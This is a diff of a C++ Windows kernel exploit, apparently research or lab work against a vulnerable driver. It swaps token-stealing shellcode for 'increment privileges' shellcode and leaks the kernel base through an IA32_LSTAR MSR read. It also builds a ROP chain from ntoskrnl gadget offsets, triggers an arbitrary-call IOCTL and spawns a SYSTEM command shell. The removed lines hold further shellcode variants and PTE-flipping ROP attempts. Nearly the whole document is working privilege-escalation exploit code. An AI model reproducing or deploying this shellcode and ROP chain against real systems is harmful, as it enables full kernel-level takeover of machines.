@@ -1,52 +1,7 @@
-// DrvExpTemplate.cpp : Questo file contiene la funzione 'main', in cui inizia e termina l'esecuzione del programma.
-//
-
 #include <iostream>
 #include <windows.h>
 
-char token_steal[] = 
-		"\x48\x31\xc0\x65\x48\x8b\x80"
-		"\x88\x01\x00\x00\x48\x8b\x80"
-		"\xb8\x00\x00\x00\x49\x89\xc0"
-		"\x48\x8b\x80\xe8\x02\x00\x00"
-		"\x48\x2d\xe8\x02\x00\x00\x48"
-		"\x8b\x88\xe0\x02\x00\x00\x48"
-		"\x83\xf9\x04\x75\xe6\x4c\x8b"
-		"\x88\x58\x03\x00\x00\x4d\x89"
-		"\x88\x58\x03\x00\x00\x3E\x48"
-		"\x8B\x04\x24\x48\x89\xF4\x48"
-		"\x83\xEC\x20\xFF\xE0";
-
-char mytoken_steal[] =
-//"\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x8D\xA0\xA8\xFA\xFF\xFF"
-//"\x48\x31\xc0\x65\x48\x8b\x80"
-//"\x88\x01\x00\x00\x48\x8b\x80"
-//"\xb8\x00\x00\x00\x49\x89\xc0"
-//"\x48\x8b\x80\xe8\x02\x00\x00"
-//"\x48\x2d\xe8\x02\x00\x00\x48"
-//"\x8b\x88\xe0\x02\x00\x00\x48"
-//"\x83\xf9\x04\x75\xe6\x4c\x8b"
-//"\x88\x58\x03\x00\x00\x4d\x89"
-//"\x88\x58\x03\x00\x00\xC3";
-
-//"\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x05\x58\x05\x00\x00\x48\x89\xC4\x48\x31\xC0\x48\xB8\xF5\xBE\xCE\x25\x00\xF8\xFF\xFF\xFF\xE0";
-
-//"\x48\xB8\xF5\xBE\xCE\x25\x00\xF8\xFF\xFF\xFF\xE0";
-
-//"\x48\x31\xC0\xC3";
-//"\x48\xB8\xEF\xBE\xAD\xDE\x00\x00\x00\x00\xC3";
-
-//"\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x8D\xA0\xA8\xFA\xFF\xFF\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x49\x89\xC0\x48\x8B\x80\x48\x04\x00\x00\x48\x2D\x48\x04\x00\x00\x48\x8B\x88\x40\x04\x00\x00\x48\x83\xF9\x04\x0F\x85\x00\x00\x00\x00\x4C\x8B\x88\xB8\x04\x00\x00\x4D\x89\x88\xB8\x04\x00\x00\xC3";
-//"\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x8D\xA0\xE8\xF7\xFF\xFF\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x49\x89\xC0\x48\x8B\x80\x48\x04\x00\x00\x48\x2D\x48\x04\x00\x00\x48\x8B\x88\x40\x04\x00\x00\x48\x83\xF9\x04\x0F\x85\x00\x00\x00\x00\x4C\x8B\x88\xB8\x04\x00\x00\x4D\x89\x88\xB8\x04\x00\x00\xC3";
-
-//<swap token>
-//"\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x8D\xA0\xE8\xF7\xFF\xFF\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x49\x89\xC0\x48\x8B\x80\x48\x04\x00\x00\x48\x2D\x48\x04\x00\x00\x48\x8B\x88\x40\x04\x00\x00\x48\x83\xF9\x04\x0F\x85\x00\x00\x00\x00\x4C\x8B\x88\xB8\x04\x00\x00\x4D\x89\x88\xB8\x04\x00\x00\x48\x31\xC0\xC3";
-
-
-//<increment privileges>
-//"\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x8D\xA0\xE8\xF7\xFF\xFF\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x4C\x8B\x80\xB8\x04\x00\x00\x49\x83\xE0\xF0\x48\xB9\xBC\xFF\xFF\xF2\x1F\x00\x00\x00\x49\x89\x48\x40\x49\x89\x48\x48\x48\x31\xC0\xC3";
-
-
+char shellcode[] =
 //<increment privileges with cleanup>
 //"\x48\x89\xC2\x48\x8B\x08\x48\x0F\xBA\xE9\x02\x48\x0F\xBA\xE9\x3F\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x4C\x8B\x80\xB8\x04\x00\x00\x49\x83\xE0\xF0\x49\xB9\xBC\xFF\xFF\xF2\x1F\x00\x00\x00\x4D\x89\x48\x40\x4D\x89\x48\x48\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x2D\x18\x08\x00\x00\x48\x89\x44\x24\x10\x48\x89\xC8\xC3";
 
@@ -433,15 +388,6 @@ BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE);
 
-	/*char* object = (char*)VirtualAlloc(
-		(LPVOID)(0x0000001af5ffe000),
-		0x12000,
-		MEM_COMMIT | MEM_RESERVE,
-		PAGE_EXECUTE_READWRITE);
-	printf("[+] object = 0x%p\n", object);
-	object = (char*)(0x1af6000000 - 0x30);
-	printf("[+] second object = 0x%p\n", object);*/
-
 	char* object = (char*)VirtualAlloc(
 		(LPVOID)(0x0000001afeffe000),
 		0x12000,
@@ -461,22 +407,9 @@ BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
 		SIZE_BUF,
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE);
-	/*char* object2 = (char*)VirtualAlloc(
-		(LPVOID)(0x0000001af5ffe000),
-		0x12000,
-		MEM_COMMIT | MEM_RESERVE,
-		PAGE_EXECUTE_READWRITE);*/
 
 	printf("[+] object2 = 0x%p\n", object2); //0x0000001af5ff0000
-	//object2 = (char*)(0x1af6000000 - 0x30);
-	//printf("[+] second object2 = 0x%p\n", object2);
 	memset(object2, 0x43, 0x30);
-
-	/*char* driverObject = (char*)VirtualAlloc(
-		(LPVOID)0x0000002a2b2a0000,
-		SIZE_BUF,
-		MEM_COMMIT | MEM_RESERVE,
-		PAGE_EXECUTE_READWRITE);*/
 
 	char* driverObject = (char*)VirtualAlloc(
 		NULL,
@@ -516,8 +449,6 @@ BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
 
 	memset(fake_stack, 0x41, 0x12000);
 	
-	
-
 	printf("[+] VirtualLock returned successfully\n");
 
 	printf("[*] ropStack = 0x%p\n", ropStack);
@@ -531,7 +462,7 @@ BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
 	}
 	memset(scbase, 0x42, 0x5000);
 	char* sc = scbase + 0x3500;
-	memcpy(sc, mytoken_steal, sizeof(mytoken_steal));
+	memcpy(sc, shellcode, sizeof(shellcode));
 
 
 	unsigned int pml4shellcode_index = ExtractPml4Index(sc);
@@ -617,49 +548,6 @@ BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
 	ropStack[index] = 0x4141414141414141; index++; // filled with rsp value
 	//<cleanup>
 
-	///*modify PTE seems not working due to KVA shadowing*/
-	////<call MiGetPteAddress in order to get PTE. PTE address returned in rax>
-	//ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
-	////ropStack[index] = 0xff000000; index++;			// shellcode address pte
-	//ropStack[index] = (ULONGLONG)(scbase+0x3000); index++;			// shellcode address pte
-	//ropStack[index] = g_ntbase + 0x203beb; index++; // pop rax; ret;
-	//ropStack[index] = g_ntbase + 0x2abae4; index++; //address of nt!MiGetPteAddress
-	//ropStack[index] = g_ntbase + 0x2803b8; index++; // jmp rax;
-	//// <call MiGetPteAddress in order to get PTE. PTE address returned in rax>
-
-	//// <Flip U=S bit>  PTE VA already in rax
-	//ropStack[index] = g_ntbase + 0x20FA62; index++;	// pop rcx; ret;
-	//ropStack[index] = 0x0000000000000063; index++;  // DIRTY + ACCESSED + R/W + PRESENT
-	//ropStack[index] = g_ntbase + 0x4531f1; index++;	// mov byte ptr[rax], cl; ret;
-	//ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;
-	//// </Flip U=S bit>
-	//
-	////ropStack[index] = g_ntbase + 0xb1451c; index++;// mov rax, cr4; or rax, 0x40; mov cr4, rax; ret;
-	////ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
-	////ropStack[index] = 0x0000000000100000; index++;	// bit 20 = 1
-	////ropStack[index] = g_ntbase + 0x304252; index++; //sub rax, rcx; ret;
-	////ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;
-
-	//// <shellcode>
-	//ropStack[index] = (ULONGLONG)sc; index++;      // Shellcode address
-	////// <shellcode>
-	//////ropStack[index] = 0xfffff80025cebef5; index++;
-	////ropStack[index] = 0xFFFFF8002D9F228B; index++;
-	////ropStack[index] = 0x0; index++;
-	////// <reset rsp>
-	////ropStack[index] = g_ntbase + 0x20dca0; index++; // KeGetCurrentThread()->mov   rax,qword ptr gs:[188h];ret
-	////ropStack[index] = g_ntbase + 0x20FA62; index++;	// pop rcx; ret;
-	////ropStack[index] = 0x0000000000000028; index++;  // offset to _KTHREAD->InitialStack
-	////ropStack[index] = g_ntbase + 0x2abaff; index++; // add rax, rcx; ret;
-	////ropStack[index] = g_ntbase + 0x235aa6; index++; // mov rax, qword ptr[rax]; ret;
-	////ropStack[index] = g_ntbase + 0x20FA62; index++;	// pop rcx; ret;
-	////ropStack[index] = 0x0000000000000028; index++;  // delta to original stack
-	////
-
-	//												// 4219c2: mov r11, qword ptr [rsp + 8]; add rsp, 0x10; ret;
-	//// <reset rsp>
-
-	//memcpy((fake_stack + 0x2020), mytoken_steal, sizeof(mytoken_steal));
 #ifdef _DEBUG
 	for (int i = 0; i < index; i++) {
 		printf("ropStack[%d] %p : 0x%p\n", i, &ropStack[i], ropStack[i]);
@@ -692,7 +580,6 @@ BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
 	if (!res) {
 		printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
 	}
-	printf("[+] IOCTL_ARBITRARYCALLDRIVER  returned successfully.\n");
 	return res;
 }
 
@@ -739,47 +626,26 @@ int main()
 
 #ifndef DEBUG
 
-	if (readMSR(IA32_GS_BASE, outputBuffer, SIZE_BUF)) {
-		printf("[+] readMSR success.\n");
-		printf("IA32_GS_BASE = 0x%8p\n", *((DWORD64*)(outputBuffer+12)));
-		printf("IA32_GS_BASE = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
-		/*printBuffer(outputBuffer, (char*)"outputBuffer", SIZE_BUF);*/
-	}
+	//if (readMSR(IA32_GS_BASE, outputBuffer, SIZE_BUF)) {
+	//	printf("[+] readMSR success.\n");
+	//	printf("IA32_GS_BASE = 0x%8p\n", *((DWORD64*)(outputBuffer+12)));
+	//	printf("IA32_GS_BASE = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
+	//	/*printBuffer(outputBuffer, (char*)"outputBuffer", SIZE_BUF);*/
+	//}
 
 	if (readMSR(IA32_LSTAR, outputBuffer, SIZE_BUF)) {
 		printf("[+] readMSR success.\n");
-		printf("IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
-		printf("IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
+		printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
+		//printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
 		g_kisystemcall64shadow = *((DWORD64*)(outputBuffer + 12));
 		g_ntbase = (DWORD64)g_kisystemcall64shadow - 0xaf61c0;
 		printf("[+] g_ntbase = 0x%p\n", g_ntbase);
 	}
 #endif
-	/*if (readMSR(IA32_STAR, outputBuffer, SIZE_BUF)) {
-		printf("[+] readMSR success.\n");
-		printf("IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
-		printf("IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
-		g_kisystemcall64shadow = *((DWORD64*)(outputBuffer + 12));
-		g_ntbase = (DWORD64)g_kisystemcall64shadow + g_kisystemcall64shadow - 0x42b70c;
-		printf("[+] g_ntbase = 0x%p\n", g_ntbase);
-		if (g_ntbase == NT_BASE) {
-			printf("[+] g_ntbase match with expected NT_BASE\n");
-		}
-	}*/
 
 	arbitraryCallDriver(outputBuffer, SIZE_BUF);
+	printf("[+] arbitraryCallDriver returned successfully.\n");
 	printf("[*] spawning system shell...\n");
 	system("cmd.exe");
 	return 0;
 }
-
-// Per eseguire il programma: CTRL+F5 oppure Debug > Avvia senza eseguire debug
-// Per eseguire il debug del programma: F5 oppure Debug > Avvia debug
-
-// Suggerimenti per iniziare: 
-//   1. Usare la finestra Esplora soluzioni per aggiungere/gestire i file
-//   2. Usare la finestra Team Explorer per connettersi al controllo del codice sorgente
-//   3. Usare la finestra di output per visualizzare l'output di compilazione e altri messaggi
-//   4. Usare la finestra Elenco errori per visualizzare gli errori
-//   5. Passare a Progetto > Aggiungi nuovo elemento per creare nuovi file di codice oppure a Progetto > Aggiungi elemento esistente per aggiungere file di codice esistenti al progetto
-//   6. Per aprire di nuovo questo progetto in futuro, passare a File > Apri > Progetto e selezionare il file con estensione sln
